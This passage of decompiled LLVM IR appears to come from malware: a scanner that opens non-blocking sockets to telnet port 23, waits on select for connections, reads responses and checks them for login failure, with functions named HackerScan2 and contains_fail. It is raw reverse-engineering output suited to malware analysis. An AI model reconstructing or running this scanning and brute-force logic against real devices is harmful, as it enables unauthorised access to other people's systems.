  store i32 %v1_804d267, i32* %eax.global-to-local, align 4
  %v0_804d26a = load i32, i32* %edx.global-to-local, align 4
  %v2_804d26a = inttoptr i32 %v1_804d267 to i32*
  store i32 %v0_804d26a, i32* %v2_804d26a, align 4
  %v0_804d26c = load i32, i32* %eax.global-to-local, align 4
  %v1_804d26c = add i32 %v0_804d26c, 4
  store i32 %v1_804d26c, i32* %eax.global-to-local, align 4
  %v0_804d26f = load i32, i32* %edx.global-to-local, align 4
  %v2_804d26f = inttoptr i32 %v1_804d26c to i32*
  store i32 %v0_804d26f, i32* %v2_804d26f, align 4
  %v0_804d271 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d271 = add i32 %v0_804d271, 4
  %v0_804d274 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d274 = inttoptr i32 %v1_804d271 to i32*
  store i32 %v0_804d274, i32* %v2_804d274, align 4
  store i32 %v1_804d230, i32* %edx.global-to-local, align 4
  store i32 %v2_804d233, i32* @eax, align 4
  store i32 %v2_804d233, i32* %v1_804d233, align 4
  store i32 %storemerge43, i32* @ebx, align 4
  %v1_804d299 = call i32 @HackerScan2(i32 %v6_804d1cb)
  %v0_804d2a3 = load i32, i32* @ebx, align 4
  %v1_804d2a5 = mul i32 %v0_804d2a3, 4
  store i32 %v1_804d2a5, i32* %edx.global-to-local, align 4
  %v2_804d2b3 = mul i32 %v0_804d2a3, 28
  %v2_804d2b5 = add i32 %v2_804d2b3, %v2_804d09e
  %v1_804d2b7 = add i32 %v2_804d2b5, 4
  store i32 %v1_804d2b7, i32* %eax.global-to-local, align 4
  %v2_804d2ba = inttoptr i32 %v1_804d2b7 to i32*
  store i32 %v1_804d299, i32* %v2_804d2ba, align 4
  br label %dec_label_pc_804d3f0

dec_label_pc_804d2c1:                             ; preds = %dec_label_pc_804d1f5
  %v5_804d2d7 = load i8, i8* %v4_804d20b, align 1
  %v6_804d2d7 = zext i8 %v5_804d2d7 to i32
  store i32 %v6_804d2d7, i32* %eax.global-to-local, align 4
  %v4_804d2dc = icmp eq i8 %v5_804d2d7, 0
  %v1_804d2de = icmp eq i1 %v4_804d2dc, false
  br i1 %v1_804d2de, label %dec_label_pc_804d3f0, label %dec_label_pc_804d2e4

dec_label_pc_804d2e4:                             ; preds = %dec_label_pc_804d2c1
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804d2fc = add i32 %v2_804d2fc, %v2_804d17b
  %v4_804d2fc = inttoptr i32 %v3_804d2fc to i8*
  %v5_804d2fc = load i8, i8* %v4_804d2fc, align 1
  %v2_804d303 = add i8 %v5_804d2fc, 1
  store i8 %v2_804d303, i8* %v4_804d2fc, align 1
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804d343 = add i32 %v2_804d343, %v2_804d17b
  %v4_804d343 = inttoptr i32 %v3_804d343 to i8*
  %v5_804d343 = load i8, i8* %v4_804d343, align 2
  %v2_804d34a = add i8 %v5_804d343, 1
  store i8 %v2_804d34a, i8* %v4_804d343, align 2
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v5_804d388 = load i8, i8* %v4_804d2fc, align 1
  %v10_804d38d = icmp eq i8 %v5_804d388, 22
  %v1_804d38f = icmp eq i1 %v10_804d38d, false
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804d38f, label %dec_label_pc_804d3b1, label %dec_label_pc_804d391

dec_label_pc_804d391:                             ; preds = %dec_label_pc_804d2e4
  store i8 1, i8* %v4_804d20b, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804d3b1:                             ; preds = %dec_label_pc_804d2e4
  %v5_804d3c7 = load i8, i8* %v4_804d343, align 2
  %v6_804d3c7 = zext i8 %v5_804d3c7 to i32
  store i32 %v6_804d3c7, i32* %eax.global-to-local, align 4
  %v10_804d3cc = icmp eq i8 %v5_804d3c7, 22
  %v1_804d3ce = icmp eq i1 %v10_804d3cc, false
  br i1 %v1_804d3ce, label %dec_label_pc_804d3f0, label %dec_label_pc_804d3d0

dec_label_pc_804d3d0:                             ; preds = %dec_label_pc_804d3b1
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804d20b, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804d3f0:                             ; preds = %dec_label_pc_804d3b1, %dec_label_pc_804d2c1, %dec_label_pc_804d218
  store i32 2, i32* %stack_var_-608, align 4
  %v0_804d3f9 = load i32, i32* @esp, align 4
  %v1_804d3f9 = inttoptr i32 %v0_804d3f9 to i32*
  store i32 23, i32* %v1_804d3f9, align 4
  %v0_804d400 = load i32, i32* %stack_var_-608, align 4
  %v1_804d400 = trunc i32 %v0_804d400 to i16
  %v2_804d400 = call i32 @htons(i16 %v1_804d400)
  store i32 0, i32* %stack_var_-600, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  %v1_804d43d = add i32 %v2_804d17d, 4
  store i32 %v1_804d43d, i32* %eax.global-to-local, align 4
  %v1_804d440 = inttoptr i32 %v1_804d43d to i32*
  %v2_804d440 = load i32, i32* %v1_804d440, align 4
  store i32 %v2_804d440, i32* %eax.global-to-local, align 4
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804d44b = load i32, i32* @esp, align 4
  %v1_804d44b = add i32 %v0_804d44b, 8
  %v2_804d44b = inttoptr i32 %v1_804d44b to i32*
  store i32 0, i32* %v2_804d44b, align 4
  %v0_804d453 = load i32, i32* @esp, align 4
  %v1_804d453 = add i32 %v0_804d453, 4
  %v2_804d453 = inttoptr i32 %v1_804d453 to i32*
  store i32 1, i32* %v2_804d453, align 4
  %v0_804d45b = load i32, i32* @esp, align 4
  %v1_804d45b = inttoptr i32 %v0_804d45b to i32*
  store i32 2, i32* %v1_804d45b, align 4
  %v2_804d462 = load i32, i32* %stack_var_-600, align 4
  %sext = mul i32 %v2_804d400, 65536
  %v3_804d462 = sdiv i32 %sext, 65536
  %v4_804d462 = call i32 @socket(i32 %v3_804d462, i32 %v2_804d440, i32 %v2_804d462)
  store i32 %v4_804d462, i32* @esi, align 4
  %v0_804d46c = load i32, i32* @ebx, align 4
  %v2_804d47c = mul i32 %v0_804d46c, 28
  %v3_804d47e = add i32 %v2_804d47c, %v2_804d09e
  %v4_804d47e = inttoptr i32 %v3_804d47e to i32*
  store i32 %v4_804d462, i32* %v4_804d47e, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804d497 = inttoptr i32 %v2_804d17d to i32*
  %v4_804d497 = load i32, i32* %v3_804d497, align 4
  store i32 %v4_804d497, i32* %eax.global-to-local, align 4
  %v10_804d49a = icmp eq i32 %v4_804d497, -1
  br i1 %v10_804d49a, label %dec_label_pc_804e319, label %dec_label_pc_804d4a3

dec_label_pc_804d4a3:                             ; preds = %dec_label_pc_804d3f0
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v4_804d4b9 = load i32, i32* %v3_804d497, align 4
  store i32 %v4_804d4b9, i32* %eax.global-to-local, align 4
  %v0_804d4bc = load i32, i32* @esp, align 4
  %v1_804d4bc = add i32 %v0_804d4bc, 8
  %v2_804d4bc = inttoptr i32 %v1_804d4bc to i32*
  store i32 0, i32* %v2_804d4bc, align 4
  %v0_804d4c4 = load i32, i32* @esp, align 4
  %v1_804d4c4 = add i32 %v0_804d4c4, 4
  %v2_804d4c4 = inttoptr i32 %v1_804d4c4 to i32*
  store i32 3, i32* %v2_804d4c4, align 4
  %v0_804d4cc = load i32, i32* %eax.global-to-local, align 4
  %v1_804d4cc = load i32, i32* @esp, align 4
  %v2_804d4cc = inttoptr i32 %v1_804d4cc to i32*
  store i32 %v0_804d4cc, i32* %v2_804d4cc, align 4
  %v1_804d4cf = load i32, i32* %stack_var_-600, align 4
  %v3_804d4cf = call i32 @__libc_fcntl(i32 %v2_804d440, i32 %v1_804d4cf, i32 0)
  %v1_804d4d6 = or i32 %v3_804d4cf, 2048
  store i32 %v1_804d4d6, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v4_804d4f2 = load i32, i32* %v3_804d497, align 4
  store i32 %v4_804d4f2, i32* %eax.global-to-local, align 4
  %v1_804d4f5 = load i32, i32* @esp, align 4
  %v2_804d4f5 = add i32 %v1_804d4f5, 8
  %v3_804d4f5 = inttoptr i32 %v2_804d4f5 to i32*
  store i32 %v1_804d4d6, i32* %v3_804d4f5, align 4
  %v0_804d4f9 = load i32, i32* @esp, align 4
  %v1_804d4f9 = add i32 %v0_804d4f9, 4
  %v2_804d4f9 = inttoptr i32 %v1_804d4f9 to i32*
  store i32 4, i32* %v2_804d4f9, align 4
  %v0_804d501 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d501 = load i32, i32* @esp, align 4
  %v2_804d501 = inttoptr i32 %v1_804d501 to i32*
  store i32 %v0_804d501, i32* %v2_804d501, align 4
  %v1_804d504 = load i32, i32* %stack_var_-600, align 4
  %v3_804d504 = call i32 @__libc_fcntl(i32 %v2_804d440, i32 %v1_804d504, i32 0)
  store i32 %v2_804d027, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v4_804d525 = load i32, i32* %v3_804d497, align 4
  store i32 %v4_804d525, i32* %eax.global-to-local, align 4
  %v0_804d528 = load i32, i32* @esp, align 4
  %v1_804d528 = add i32 %v0_804d528, 8
  %v2_804d528 = inttoptr i32 %v1_804d528 to i32*
  store i32 16, i32* %v2_804d528, align 4
  %v1_804d530 = load i32, i32* @esp, align 4
  %v2_804d530 = add i32 %v1_804d530, 4
  %v3_804d530 = inttoptr i32 %v2_804d530 to i32*
  store i32 %v2_804d027, i32* %v3_804d530, align 4
  %v0_804d534 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d534 = load i32, i32* @esp, align 4
  %v2_804d534 = inttoptr i32 %v1_804d534 to i32*
  store i32 %v0_804d534, i32* %v2_804d534, align 4
  %v1_804d537 = load i32, i32* %stack_var_-600, align 4
  %v3_804d537 = call i32 @__libc_connect(i32 %v2_804d440, i32 %v1_804d537, i32 0)
  store i32 %v3_804d537, i32* %eax.global-to-local, align 4
  %v10_804d53c = icmp eq i32 %v3_804d537, -1
  %v1_804d53f = icmp eq i1 %v10_804d53c, false
  br i1 %v1_804d53f, label %dec_label_pc_804d58e, label %dec_label_pc_804d541

dec_label_pc_804d541:                             ; preds = %dec_label_pc_804d4a3
  %v1_804d541 = call i32 @__errno_location(i32 %v2_804d440)
  store i32 %v1_804d541, i32* %eax.global-to-local, align 4
  %v1_804d546 = inttoptr i32 %v1_804d541 to i32*
  %v2_804d546 = load i32, i32* %v1_804d546, align 4
  store i32 %v2_804d546, i32* %eax.global-to-local, align 4
  %v9_804d548 = icmp eq i32 %v2_804d546, 115
  br i1 %v9_804d548, label %dec_label_pc_804d58e, label %dec_label_pc_804d54d

dec_label_pc_804d54d:                             ; preds = %dec_label_pc_804d541
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v4_804d563 = load i32, i32* %v3_804d497, align 4
  store i32 %v4_804d563, i32* %eax.global-to-local, align 4
  %v1_804d566 = load i32, i32* @esp, align 4
  %v2_804d566 = inttoptr i32 %v1_804d566 to i32*
  store i32 %v4_804d563, i32* %v2_804d566, align 4
  %v1_804d569 = call i32 @sclose(i32 %v2_804d440)
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804d20b, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804d58e:                             ; preds = %dec_label_pc_804d541, %dec_label_pc_804d4a3
  store i8 1, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v1_804d17f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d182, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804d5cf:                             ; preds = %dec_label_pc_804d1b5
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804d5d9, i32* @edi, align 4
  %v5_804d5e0 = call i8* @_memset(i8* %tmp38, i32 0, i32 32)
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804d5fe = inttoptr i32 %v2_804d17d to i32*
  %v4_804d5fe = load i32, i32* %v3_804d5fe, align 4
  %v2_804d603 = udiv i32 %v4_804d5fe, 32
  store i32 %v2_804d603, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v4_804d61c = load i32, i32* %v3_804d5fe, align 4
  %v1_804d61f = urem i32 %v4_804d61c, 32
  store i32 %v1_804d61f, i32* %eax.global-to-local, align 4
  %v0_804d622 = load i32, i32* @ebp, align 4
  %v2_804d622 = mul nuw nsw i32 %v2_804d603, 4
  %v3_804d622 = add nsw i32 %v2_804d622, -316
  %v4_804d622 = add i32 %v3_804d622, %v0_804d622
  %v5_804d622 = inttoptr i32 %v4_804d622 to i32*
  %v6_804d622 = load i32, i32* %v5_804d622, align 4
  %v9_804d622 = shl i32 1, %v1_804d61f
  %v12_804d622 = or i32 %v6_804d622, %v9_804d622
  store i32 %v12_804d622, i32* %v5_804d622, align 4
  store i32 0, i32* %stack_var_-328, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v4_804d653 = load i32, i32* %v3_804d5fe, align 4
  %v1_804d656 = add i32 %v4_804d653, 1
  store i32 %v1_804d656, i32* %edx.global-to-local, align 4
  %v1_804d65f = load i32, i32* @esp, align 4
  %v2_804d65f = add i32 %v1_804d65f, 16
  %v3_804d65f = inttoptr i32 %v2_804d65f to i32*
  store i32 %v2_804d659, i32* %v3_804d65f, align 4
  %v0_804d663 = load i32, i32* @esp, align 4
  %v1_804d663 = add i32 %v0_804d663, 12
  %v2_804d663 = inttoptr i32 %v1_804d663 to i32*
  store i32 0, i32* %v2_804d663, align 4
  store i32 %v2_804d5d9, i32* %eax.global-to-local, align 4
  %v1_804d671 = load i32, i32* @esp, align 4
  %v2_804d671 = add i32 %v1_804d671, 8
  %v3_804d671 = inttoptr i32 %v2_804d671 to i32*
  store i32 %v2_804d5d9, i32* %v3_804d671, align 4
  %v0_804d675 = load i32, i32* @esp, align 4
  %v1_804d675 = add i32 %v0_804d675, 4
  %v2_804d675 = inttoptr i32 %v1_804d675 to i32*
  store i32 0, i32* %v2_804d675, align 4
  %v0_804d67d = load i32, i32* %edx.global-to-local, align 4
  %v1_804d67d = load i32, i32* @esp, align 4
  %v2_804d67d = inttoptr i32 %v1_804d67d to i32*
  store i32 %v0_804d67d, i32* %v2_804d67d, align 4
  %v0_804d680 = load i32, i32* %stack_var_-328, align 4
  %v2_804d680 = load i32, i32* %stack_var_-320, align 4
  %v5_804d680 = call i32 @__libc_select(i32 %v0_804d680, i32 10, i32 %v2_804d680, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804d680, i32* %eax.global-to-local, align 4
  %v12_804d688 = icmp eq i32 %v5_804d680, 1
  %v1_804d68c = icmp eq i1 %v12_804d688, false
  br i1 %v1_804d68c, label %dec_label_pc_804d851, label %dec_label_pc_804d692

dec_label_pc_804d692:                             ; preds = %dec_label_pc_804d5cf
  store i32 4, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v4_804d6bc = load i32, i32* %v3_804d5fe, align 4
  store i32 %v4_804d6bc, i32* %edx.global-to-local, align 4
  %v1_804d6c5 = load i32, i32* @esp, align 4
  %v2_804d6c5 = add i32 %v1_804d6c5, 16
  %v3_804d6c5 = inttoptr i32 %v2_804d6c5 to i32*
  store i32 %v2_804d6bf, i32* %v3_804d6c5, align 4
  store i32 %v2_804d6c9, i32* %eax.global-to-local, align 4
  %v1_804d6cf = load i32, i32* @esp, align 4
  %v2_804d6cf = add i32 %v1_804d6cf, 12
  %v3_804d6cf = inttoptr i32 %v2_804d6cf to i32*
  store i32 %v2_804d6c9, i32* %v3_804d6cf, align 4
  %v0_804d6d3 = load i32, i32* @esp, align 4
  %v1_804d6d3 = add i32 %v0_804d6d3, 8
  %v2_804d6d3 = inttoptr i32 %v1_804d6d3 to i32*
  store i32 4, i32* %v2_804d6d3, align 4
  %v0_804d6db = load i32, i32* @esp, align 4
  %v1_804d6db = add i32 %v0_804d6db, 4
  %v2_804d6db = inttoptr i32 %v1_804d6db to i32*
  store i32 1, i32* %v2_804d6db, align 4
  %v0_804d6e3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d6e3 = load i32, i32* @esp, align 4
  %v2_804d6e3 = inttoptr i32 %v1_804d6e3 to i32*
  store i32 %v0_804d6e3, i32* %v2_804d6e3, align 4
  %v0_804d6e6 = load i32, i32* %stack_var_-336, align 4
  %v1_804d6e6 = load i32, i32* %stack_var_-332, align 4
  %v2_804d6e6 = load i32, i32* %stack_var_-328, align 4
  %v4_804d6e6 = load i32, i32* %stack_var_-320, align 4
  %v5_804d6e6 = call i32 @getsockopt(i32 %v0_804d6e6, i32 %v1_804d6e6, i32 %v2_804d6e6, i32 10, i32 %v4_804d6e6)
  %v3_804d6eb = load i32, i32* %stack_var_-336, align 4
  %v1_804d6f1 = icmp eq i32 %v3_804d6eb, 0
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v4_804d767 = load i32, i32* %v3_804d5fe, align 4
  store i32 %v4_804d767, i32* %eax.global-to-local, align 4
  %v0_804d76a = load i32, i32* @esp, align 4
  br i1 %v1_804d6f1, label %dec_label_pc_804d751, label %dec_label_pc_804d6f5

dec_label_pc_804d6f5:                             ; preds = %dec_label_pc_804d692
  %v2_804d70e = inttoptr i32 %v0_804d76a to i32*
  store i32 %v4_804d767, i32* %v2_804d70e, align 4
  %v0_804d711 = load i32, i32* %stack_var_-336, align 4
  %v1_804d711 = call i32 @sclose(i32 %v0_804d711)
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804d747 = add i32 %v2_804d127, %v2_804d17b
  %v4_804d747 = inttoptr i32 %v3_804d747 to i8*
  store i8 1, i8* %v4_804d747, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804d751:                             ; preds = %dec_label_pc_804d692
  %v1_804d76a = add i32 %v0_804d76a, 8
  %v2_804d76a = inttoptr i32 %v1_804d76a to i32*
  store i32 0, i32* %v2_804d76a, align 4
  %v0_804d772 = load i32, i32* @esp, align 4
  %v1_804d772 = add i32 %v0_804d772, 4
  %v2_804d772 = inttoptr i32 %v1_804d772 to i32*
  store i32 3, i32* %v2_804d772, align 4
  %v0_804d77a = load i32, i32* %eax.global-to-local, align 4
  %v1_804d77a = load i32, i32* @esp, align 4
  %v2_804d77a = inttoptr i32 %v1_804d77a to i32*
  store i32 %v0_804d77a, i32* %v2_804d77a, align 4
  %v0_804d77d = load i32, i32* %stack_var_-336, align 4
  %v1_804d77d = load i32, i32* %stack_var_-332, align 4
  %v2_804d77d = load i32, i32* %stack_var_-328, align 4
  %v3_804d77d = call i32 @__libc_fcntl(i32 %v0_804d77d, i32 %v1_804d77d, i32 %v2_804d77d)
  %v1_804d784 = and i32 %v3_804d77d, -2049
  store i32 %v1_804d784, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v4_804d7a0 = load i32, i32* %v3_804d5fe, align 4
  store i32 %v4_804d7a0, i32* %eax.global-to-local, align 4
  %v1_804d7a3 = load i32, i32* @esp, align 4
  %v2_804d7a3 = add i32 %v1_804d7a3, 8
  %v3_804d7a3 = inttoptr i32 %v2_804d7a3 to i32*
  store i32 %v1_804d784, i32* %v3_804d7a3, align 4
  %v0_804d7a7 = load i32, i32* @esp, align 4
  %v1_804d7a7 = add i32 %v0_804d7a7, 4
  %v2_804d7a7 = inttoptr i32 %v1_804d7a7 to i32*
  store i32 4, i32* %v2_804d7a7, align 4
  %v0_804d7af = load i32, i32* %eax.global-to-local, align 4
  %v1_804d7af = load i32, i32* @esp, align 4
  %v2_804d7af = inttoptr i32 %v1_804d7af to i32*
  store i32 %v0_804d7af, i32* %v2_804d7af, align 4
  %v0_804d7b2 = load i32, i32* %stack_var_-336, align 4
  %v1_804d7b2 = load i32, i32* %stack_var_-332, align 4
  %v2_804d7b2 = load i32, i32* %stack_var_-328, align 4
  %v3_804d7b2 = call i32 @__libc_fcntl(i32 %v0_804d7b2, i32 %v1_804d7b2, i32 %v2_804d7b2)
  store i32 0, i32* %v1_804d182, align 4
  %v1_804d7f3 = add i32 %v2_804d17d, 20
  %v2_804d7f3 = inttoptr i32 %v1_804d7f3 to i16*
  store i16 0, i16* %v2_804d7f3, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  %v1_804d811 = add i32 %v2_804d17d, 24
  store i32 %v1_804d811, i32* %eax.global-to-local, align 4
  %v1_804d814 = inttoptr i32 %v1_804d811 to i32*
  %v2_804d814 = load i32, i32* %v1_804d814, align 4
  store i32 %v2_804d814, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804d81d = load i32, i32* @esp, align 4
  %v2_804d81d = add i32 %v1_804d81d, 8
  %v3_804d81d = inttoptr i32 %v2_804d81d to i32*
  store i32 1024, i32* %v3_804d81d, align 4
  %v0_804d821 = load i32, i32* @esp, align 4
  %v1_804d821 = add i32 %v0_804d821, 4
  %v2_804d821 = inttoptr i32 %v1_804d821 to i32*
  store i32 0, i32* %v2_804d821, align 4
  %v0_804d829 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d829 = load i32, i32* @esp, align 4
  %v2_804d829 = inttoptr i32 %v1_804d829 to i32*
  store i32 %v0_804d829, i32* %v2_804d829, align 4
  %v0_804d82c = load i32, i32* %stack_var_-336, align 4
  %v1_804d82c = load i32, i32* %stack_var_-332, align 4
  %v2_804d82c = load i32, i32* %stack_var_-328, align 4
  %v3_804d82c = inttoptr i32 %v0_804d82c to i8*
  %v4_804d82c = call i32 @__GI_memset(i8* %v3_804d82c, i32 %v1_804d82c, i32 %v2_804d82c)
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_804d1cb, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804d851:                             ; preds = %dec_label_pc_804d5cf
  %v13_804d851 = icmp eq i32 %v5_804d680, -1
  %v1_804d855 = icmp eq i1 %v13_804d851, false
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804d855, label %dec_label_pc_804d8b3, label %dec_label_pc_804d857

dec_label_pc_804d857:                             ; preds = %dec_label_pc_804d851
  %v4_804d86d = load i32, i32* %v3_804d5fe, align 4
  store i32 %v4_804d86d, i32* %eax.global-to-local, align 4
  %v1_804d870 = load i32, i32* @esp, align 4
  %v2_804d870 = inttoptr i32 %v1_804d870 to i32*
  store i32 %v4_804d86d, i32* %v2_804d870, align 4
  %v1_804d873 = call i32 @sclose(i32 %v5_804d680)
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804d8a9 = add i32 %v2_804d127, %v2_804d17b
  %v4_804d8a9 = inttoptr i32 %v3_804d8a9 to i8*
  store i8 1, i8* %v4_804d8a9, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804d8b3:                             ; preds = %dec_label_pc_804d851
  store i32 %v1_804d17f, i32* %eax.global-to-local, align 4
  %v2_804d8ce = load i32, i32* %v1_804d182, align 4
  store i32 %v2_804d8ce, i32* %eax.global-to-local, align 4
  %v1_804d8d0 = add i32 %v2_804d8ce, 6
  store i32 %v1_804d8d0, i32* @ebx, align 4
  %v0_804d8d3 = load i32, i32* @esp, align 4
  %v1_804d8d3 = inttoptr i32 %v0_804d8d3 to i32*
  store i32 0, i32* %v1_804d8d3, align 4
  %v1_804d8da = inttoptr i32 %v5_804d680 to i32*
  %v2_804d8da = call i32 @__GI_time(i32* %v1_804d8da)
  store i32 %v2_804d8da, i32* %eax.global-to-local, align 4
  %v0_804d8df = load i32, i32* @ebx, align 4
  %v7_804d8df = icmp ult i32 %v0_804d8df, %v2_804d8da
  %v1_804d8e1 = icmp eq i1 %v7_804d8df, false
  br i1 %v1_804d8e1, label %dec_label_pc_804e319, label %dec_label_pc_804d8e7

dec_label_pc_804d8e7:                             ; preds = %dec_label_pc_804d8b3
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v4_804d8fd = load i32, i32* %v3_804d5fe, align 4
  store i32 %v4_804d8fd, i32* %eax.global-to-local, align 4
  %v1_804d900 = load i32, i32* @esp, align 4
  %v2_804d900 = inttoptr i32 %v1_804d900 to i32*
  store i32 %v4_804d8fd, i32* %v2_804d900, align 4
  %v0_804d903 = load i32, i32* %stack_var_-336, align 4
  %v1_804d903 = call i32 @sclose(i32 %v0_804d903)
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804d939 = add i32 %v2_804d127, %v2_804d17b
  %v4_804d939 = inttoptr i32 %v3_804d939 to i8*
  store i8 1, i8* %v4_804d939, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804d943:                             ; preds = %dec_label_pc_804d1b5
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  %v1_804d95b = add i32 %v2_804d17d, 24
  store i32 %v1_804d95b, i32* %eax.global-to-local, align 4
  %v1_804d95e = inttoptr i32 %v1_804d95b to i32*
  %v2_804d95e = load i32, i32* %v1_804d95e, align 4
  store i32 %v2_804d95e, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804d976 = inttoptr i32 %v2_804d17d to i32*
  %v4_804d976 = load i32, i32* %v3_804d976, align 4
  store i32 %v4_804d976, i32* %edx.global-to-local, align 4
  %v0_804d979 = load i32, i32* @esp, align 4
  %v1_804d979 = add i32 %v0_804d979, 16
  %v2_804d979 = inttoptr i32 %v1_804d979 to i32*
  store i32 134607132, i32* %v2_804d979, align 4
  %v0_804d981 = load i32, i32* @esp, align 4
  %v1_804d981 = add i32 %v0_804d981, 12
  %v2_804d981 = inttoptr i32 %v1_804d981 to i32*
  store i32 1024, i32* %v2_804d981, align 4
  %v0_804d989 = load i32, i32* @ebx, align 4
  %v1_804d989 = load i32, i32* @esp, align 4
  %v2_804d989 = add i32 %v1_804d989, 8
  %v3_804d989 = inttoptr i32 %v2_804d989 to i32*
  store i32 %v0_804d989, i32* %v3_804d989, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v1_804d990 = load i32, i32* @esp, align 4
  %v2_804d990 = add i32 %v1_804d990, 4
  %v3_804d990 = inttoptr i32 %v2_804d990 to i32*
  store i32 10, i32* %v3_804d990, align 4
  %v0_804d994 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d994 = load i32, i32* @esp, align 4
  %v2_804d994 = inttoptr i32 %v1_804d994 to i32*
  store i32 %v0_804d994, i32* %v2_804d994, align 4
  %v1_804d997 = call i32 @read_until_response(i32 %v6_804d1cb)
  %v1_804d99c = icmp eq i32 %v1_804d997, 0
  store i32 %v1_804d16d, i32* @edx, align 4
  store i32 %v2_804d17d, i32* %eax.global-to-local, align 4
  br i1 %v1_804d99c, label %dec_label_pc_804da09, label %dec_label_pc_804d9a0

dec_label_pc_804d9a0:                             ; preds = %dec_label_pc_804d943
  store i32 %v1_804d95b, i32* %eax.global-to-local, align 4
  %v2_804d9bb = load i32, i32* %v1_804d95e, align 4
  store i32 %v2_804d9bb, i32* %eax.global-to-local, align 4
  %v1_804d9bd = load i32, i32* @esp, align 4
  %v2_804d9bd = inttoptr i32 %v1_804d9bd to i32*
  store i32 %v2_804d9bb, i32* %v2_804d9bd, align 4
  %v0_804d9c0 = call i32 @contains_fail()
  %v1_804d9c5 = icmp eq i32 %v0_804d9c0, 0
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804d9c5, label %dec_label_pc_804d9e9, label %dec_label_pc_804d9c9

dec_label_pc_804d9c9:                             ; preds = %dec_label_pc_804d9a0
  store i8 0, i8* %v4_804d1cb, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804d9e9:                             ; preds = %dec_label_pc_804d9a0
  store i8 3, i8* %v4_804d1cb, align 4
